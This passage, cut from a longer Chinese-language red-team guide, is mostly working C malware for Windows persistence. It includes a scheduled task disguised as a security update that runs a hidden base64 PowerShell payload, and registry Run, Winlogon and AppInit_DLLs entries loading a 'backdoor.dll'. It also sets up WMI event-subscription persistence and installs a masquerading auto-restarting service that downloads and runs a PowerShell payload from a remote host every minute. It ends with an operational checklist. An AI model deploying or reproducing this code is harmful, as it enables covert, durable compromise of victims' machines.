                pExecAction->put_Arguments(_bstr_t("-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('BASE64_ENCODED_PAYLOAD')))\""));
                pExecAction->put_WorkingDirectory(_bstr_t("C:\\Windows\\System32"));
                pExecAction->Release();
            }
            pAction->Release();
        }
        pActionCollection->Release();
    }
    
    // 注册任务
    IRegisteredTask* pRegisteredTask = NULL;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t("Microsoft\\Windows\\Windows Security\\SecurityUpdate"),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_SERVICE_ACCOUNT,
        _variant_t(""),
        &pRegisteredTask
    );
    
    if (SUCCEEDED(hr)) {
        printf("[+] Obfuscated scheduled task created successfully\n");
        pRegisteredTask->Release();
    } else {
        printf("[!] Failed to create scheduled task: 0x%08X\n", hr);
    }
    
    // 清理
    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    CoUninitialize();
    
    return SUCCEEDED(hr);
}
```

### 注册表启动项

#### 高级注册表持久化
```c
// registry_persistence.c
#include <windows.h>
#include <stdio.h>

// 注册表持久化位置
const char* registry_persistence_locations[] = {
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",
    "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell",
    "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit",
    "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run",
    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders",
    "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders",
    "Software\\Microsoft\\Ctf\\LangBarAddin",
    "Software\\Microsoft\\Office\\Outlook\\Addins",
    "Software\\Microsoft\\Office\\Word\\Addins",
    "Software\\Microsoft\\Office\\Excel\\Addins",
    "Software\\Classes\\*\\ShellEx\\ContextMenuHandlers",
    "Software\\Classes\\Directory\\ShellEx\\ContextMenuHandlers",
    "Software\\Classes\\Drive\\ShellEx\\ContextMenuHandlers"
};

// 添加注册表启动项
BOOL add_registry_startup(const char* reg_path, const char* value_name, const char* command) {
    HKEY hKey;
    LONG result;
    
    // 打开注册表键
    result = RegOpenKeyExA(HKEY_CURRENT_USER, reg_path, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) {
        // 如果键不存在，创建它
        result = RegCreateKeyExA(HKEY_CURRENT_USER, reg_path, 0, NULL,
                                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
        if (result != ERROR_SUCCESS) {
            return FALSE;
        }
    }
    
    // 设置值
    result = RegSetValueExA(hKey, value_name, 0, REG_SZ, (BYTE*)command, strlen(command) + 1);
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS);
}

// 使用RunOnceEx（更隐蔽）
BOOL add_runonceex_persistence(const char* value_name, const char* command) {
    const char* runonceex_path = "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx";
    
    HKEY hKey;
    LONG result = RegCreateKeyExA(HKEY_CURRENT_USER, runonceex_path, 0, NULL,
                                 REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL);
    
    if (result != ERROR_SUCCESS) return FALSE;
    
    // 创建标题
    result = RegSetValueExA(hKey, "Title", 0, REG_SZ, (BYTE*)"Installing Security Updates", 30);
    
    // 添加依赖项
    result = RegSetValueExA(hKey, "Depend", 0, REG_SZ, (BYTE*)"", 1);
    
    // 添加要执行的命令
    char value_key[256];
    sprintf(value_key, "%s", value_name);
    result = RegSetValueExA(hKey, value_key, 0, REG_SZ, (BYTE*)command, strlen(command) + 1);
    
    RegCloseKey(hKey);
    
    return (result == ERROR_SUCCESS);
}

// 使用Winlogon（系统级持久化）
BOOL add_winlogon_persistence(const char* value_name, const char* command) {
    const char* winlogon_path = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, winlogon_path, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) return FALSE;
    
    // 修改Userinit（在用户登录时执行）
    char current_userinit[1024] = {0};
    DWORD data_size = sizeof(current_userinit);
    DWORD type;
    
    result = RegQueryValueExA(hKey, "Userinit", NULL, &type, (BYTE*)current_userinit, &data_size);
    if (result == ERROR_SUCCESS) {
        // 追加我们的命令
        char new_userinit[2048];
        sprintf(new_userinit, "%s,%s", current_userinit, command);
        
        result = RegSetValueExA(hKey, "Userinit", 0, REG_SZ, (BYTE*)new_userinit, strlen(new_userinit) + 1);
    }
    
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// 使用AppInit_DLLs（DLL注入）
BOOL add_appinit_persistence(const char* dll_path) {
    const char* appinit_path = "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows";
    
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, appinit_path, 0, KEY_SET_VALUE, &hKey);
    if (result != ERROR_SUCCESS) return FALSE;
    
    // 启用AppInit_DLLs
    DWORD enable_appinit = 1;
    result = RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)&enable_appinit, sizeof(DWORD));
    
    // 设置AppInit_DLLs
    result = RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dll_path, strlen(dll_path) + 1);
    
    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// 使用WMI事件（高级持久化）
BOOL add_wmi_persistence(const char* command) {
    // 创建MOF文件
    char mof_content[4096];
    sprintf(mof_content, 
        "#pragma namespace(\\\\\\\\.\\\\root\\\\subscription)\\n"
        "instance of __EventFilter as $Filt\\n"
        "{\\n"
        "    Name = \"RedTeamFilter\";\\n"
        "    EventNamespace = \"root\\\\cimv2\";\\n"
        "    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320\";\\n"
        "    QueryLanguage = \"WQL\";\\n"
        "};\\n"
        "instance of ActiveScriptEventConsumer as $Cons\\n"
        "{\\n"
        "    Name = \"RedTeamConsumer\";\\n"
        "    ScriptingEngine = \"JScript\";\\n"
        "    ScriptText = \"var WSH = new ActiveXObject('WScript.Shell'); WSH.Run('%s');\";\\n"
        "};\\n"
        "instance of __FilterToConsumerBinding\\n"
        "{\\n"
        "    Filter = $Filt;\\n"
        "    Consumer = $Cons;\\n"
        "};\\n", command);
    
    // 写入MOF文件
    char mof_filename[256];
    sprintf(mof_filename, "redteam_%d.mof", GetTickCount());
    
    HANDLE hFile = CreateFileA(mof_filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    
    DWORD written;
    WriteFile(hFile, mof_content, strlen(mof_content), &written, NULL);
    CloseHandle(hFile);
    
    // 编译MOF文件
    char compile_cmd[MAX_PATH * 2];
    sprintf(compile_cmd, "mofcomp.exe %s", mof_filename);
    WinExec(compile_cmd, SW_HIDE);
    
    return TRUE;
}

// 自动注册表持久化
void auto_registry_persistence(const char* persistence_command) {
    printf("[*] Setting up registry persistence...\n");
    
    // 1. 标准Run键
    if (add_registry_startup("Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                           "SecurityUpdate", persistence_command)) {
        printf("[+] Added to Run key\n");
    }
    
    // 2. RunOnceEx（更隐蔽）
    if (add_runonceex_persistence("SecurityUpdate", persistence_command)) {
        printf("[+] Added to RunOnceEx\n");
    }
    
    // 3. Winlogon（需要管理员权限）
    if (IsUserAnAdmin()) {
        if (add_winlogon_persistence("SecurityUpdate", persistence_command)) {
            printf("[+] Added to Winlogon\n");
        }
        
        if (add_appinit_persistence("C:\\Windows\\System32\\backdoor.dll")) {
            printf("[+] Added AppInit_DLLs\n");
        }
    }
    
    // 4. WMI事件（高级）
    if (add_wmi_persistence(persistence_command)) {
        printf("[+] Added WMI event persistence\n");
    }
    
    printf("[+] Registry persistence setup complete\n");
}
```

### 服务持久化

#### 恶意服务创建
```c
// malicious_service.c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

// 服务主函数
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
// 服务控制处理器
VOID WINAPI ServiceCtrlHandler(DWORD ctrlCode);

// 服务状态
SERVICE_STATUS g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
HANDLE g_ServiceStopEvent = INVALID_HANDLE_VALUE;

// 服务主函数
VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    DWORD status = NO_ERROR;
    
    // 注册服务控制处理器
    g_StatusHandle = RegisterServiceCtrlHandlerA("RedTeamService", ServiceCtrlHandler);
    if (g_StatusHandle == NULL) {
        return;
    }
    
    // 设置服务状态
    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    // 创建停止事件
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) {
        g_ServiceStatus.dwControlsAccepted = 0;
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        g_ServiceStatus.dwWin32ExitCode = GetLastError();
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }
    
    // 报告运行状态
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 0;
    
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    // 主要服务逻辑
    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
        // 执行恶意操作
        execute_malicious_payload();
        
        // 等待一段时间
        Sleep(60000); // 每分钟执行一次
    }
    
    // 清理并停止服务
    CloseHandle(g_ServiceStopEvent);
    
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwCheckPoint = 3;
    
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

// 服务控制处理器
VOID WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
    switch (ctrlCode) {
        case SERVICE_CONTROL_STOP:
            if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
                break;
            
            g_ServiceStatus.dwControlsAccepted = 0;
            g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
            g_ServiceStatus.dwWin32ExitCode = 0;
            g_ServiceStatus.dwCheckPoint = 4;
            
            SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
            
            // 触发停止事件
            SetEvent(g_ServiceStopEvent);
            break;
            
        default:
            break;
    }
}

// 执行恶意负载
void execute_malicious_payload() {
    // 下载并执行Payload
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet != NULL) {
        HINTERNET hUrl = InternetOpenUrlA(hInternet, "http://192.168.1.100:8080/service_payload.ps1", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hUrl != NULL) {
            char buffer[4096];
            DWORD bytes_read;
            
            // 读取Payload到内存
            if (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytes_read) && bytes_read > 0) {
                // 执行PowerShell命令
                char ps_command[8192];
                sprintf(ps_command, "powershell.exe -WindowStyle Hidden -Command \"%s\"", buffer);
                WinExec(ps_command, SW_HIDE);
            }
            
            InternetCloseHandle(hUrl);
        }
        InternetCloseHandle(hInternet);
    }
}

// 安装服务
BOOL install_malicious_service() {
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager == NULL) {
        printf("[!] Failed to open service manager\n");
        return FALSE;
    }
    
    // 获取当前可执行文件路径
    char current_path[MAX_PATH];
    GetModuleFileNameA(NULL, current_path, MAX_PATH);
    
    // 创建服务
    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        "RedTeamService",
        "Windows Security Update Service",
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL,
        current_path,
        NULL, NULL, NULL, NULL, NULL
    );
    
    if (hService == NULL) {
        printf("[!] Failed to create service\n");
        CloseServiceHandle(hSCManager);
        return FALSE;
    }
    
    // 设置服务描述
    SERVICE_DESCRIPTIONA description;
    description.lpDescription = "Provides security updates for Windows operating system";
    ChangeServiceConfig2A(hService, SERVICE_CONFIG_DESCRIPTION, &description);
    
    // 设置服务失败操作
    SC_ACTION actions[3];
    actions[0].Type = SC_ACTION_RESTART;
    actions[0].Delay = 60000; // 1分钟后重启
    actions[1].Type = SC_ACTION_RESTART;
    actions[1].Delay = 60000;
    actions[2].Type = SC_ACTION_NONE;
    actions[2].Delay = 0;
    
    SERVICE_FAILURE_ACTIONSA failure_actions;
    failure_actions.dwResetPeriod = 86400; // 24小时
    failure_actions.lpRebootMsg = NULL;
    failure_actions.lpCommand = NULL;
    failure_actions.cActions = 3;
    failure_actions.lpsaActions = actions;
    
    ChangeServiceConfig2A(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &failure_actions);
    
    printf("[+] Malicious service installed successfully\n");
    
    // 启动服务
    if (StartServiceA(hService, 0, NULL)) {
        printf("[+] Service started successfully\n");
    } else {
        printf("[!] Failed to start service\n");
    }
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    return TRUE;
}

// 主函数
int main() {
    SERVICE_TABLE_ENTRYA ServiceTable[] = {
        {"RedTeamService", (LPSERVICE_MAIN_FUNCTIONA)ServiceMain},
        {NULL, NULL}
    };
    
    if (StartServiceCtrlDispatcherA(ServiceTable)) {
        // 以服务模式运行
        return 0;
    }
    
    // 以安装模式运行
    if (GetLastError() == ERROR_FAILED_SERVICE_CONTROLLER_CONNECT) {
        printf("[*] Installing malicious service...\n");
        if (install_malicious_service()) {
            printf("[+] Service installation complete\n");
        } else {
            printf("[!] Service installation failed\n");
        }
    }
    
    return 0;
}
```

---

## 实战检查清单

### Windows提权
- [ ] 内核漏洞已检测
- [ ] 服务配置错误已识别
- [ ] AlwaysInstallElevated已检查
- [ ] 提权漏洞已利用

### 计划任务持久化
- [ ] 恶意计划任务已创建
- [ ] 任务触发器已配置
- [ ] 任务权限已设置
- [ ] 任务混淆已应用

### 注册表持久化
- [ ] 注册表启动项已添加
- [ ] RunOnceEx已配置
- [ ] Winlogon已修改
- [ ] WMI事件已设置

### 服务持久化
- [ ] 恶意服务已创建
- [ ] 服务自动启动已配置
- [ ] 服务失败操作已设置
- [ ] 服务描述已伪装